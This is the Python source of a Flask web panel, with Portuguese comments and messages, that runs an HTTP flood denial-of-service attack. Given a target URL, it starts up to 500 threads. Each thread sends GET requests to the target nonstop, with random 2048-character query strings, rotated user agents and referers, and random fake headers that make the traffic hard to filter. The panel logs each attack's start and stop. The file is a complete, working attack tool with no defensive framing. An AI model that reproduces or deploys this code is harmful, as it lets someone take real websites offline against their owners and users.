from flask import Flask, render_template, request, jsonify
import threading
import requests
import random
import string
import time
import os

app = Flask(__name__)

# Dados globais
alvo = ""
threads = 0
rodando = False
log_ataques = []
lock = threading.Lock()

# Pasta de logs
if not os.path.exists("logs"):
    os.makedirs("logs")

def gerar_payload(tamanho=2048):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=tamanho))

def gerar_headers():
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "curl/7.68.0",
            "Wget/1.20.3"
        ]),
        "Referer": random.choice([
            "https://google.com", "https://bing.com", "https://yahoo.com", "https://duckduckgo.com"
        ]),
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }
    for _ in range(10):
        fake_key = "X-Fake-" + ''.join(random.choices(string.ascii_letters, k=5))
        fake_value = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        headers[fake_key] = fake_value
    return headers

def flood():
    while rodando:
        try:
            payload = gerar_payload()
            url = f"{alvo}/?q={payload}"
            headers = gerar_headers()
            requests.get(url, headers=headers, timeout=5)
        except:
            pass

@app.route('/')
def home():
    return render_template('index.html', logs=log_ataques)

@app.route('/start', methods=['POST'])
def start():
    global alvo, threads, rodando

    if rodando:
        return jsonify({'status': 'erro', 'mensagem': '⚠️ Um ataque já está em andamento. Pare ele antes de iniciar outro.'})

    alvo = request.form.get('alvo')
    threads = int(request.form.get('threads', 100))

    if threads > 500:
        return jsonify({'status': 'erro', 'mensagem': '❌ Limite máximo é 500 threads.'})

    if not alvo.startswith("http"):
        return jsonify({'status': 'erro', 'mensagem': '❌ URL inválida. Use http:// ou https://'})

    rodando = True
    inicio = time.strftime("%Y-%m-%d %H:%M:%S")

    log = f'🟢 [{inicio}] Ataque iniciado | Alvo: {alvo} | Threads: {threads}'
    log_ataques.append(log)
    salvar_log(log)

    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()

    return jsonify({'status': 'ok', 'mensagem': f'🚀 Ataque iniciado com {threads} threads no alvo {alvo}.'})

@app.route('/stop', methods=['POST'])
def stop():
    global rodando

    if not rodando:
        return jsonify({'status': 'erro', 'mensagem': '⚠️ Nenhum ataque em andamento.'})

    rodando = False
    fim = time.strftime("%Y-%m-%d %H:%M:%S")

    log = f'🔴 [{fim}] Ataque parado | Alvo: {alvo} | Threads: {threads}'
    log_ataques.append(log)
    salvar_log(log)

    return jsonify({'status': 'ok', 'mensagem': '🛑 Ataque parado com sucesso.'})

def salvar_log(mensagem):
    with open('logs/ataques.txt', 'a') as f:
        f.write(mensagem + '\n')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
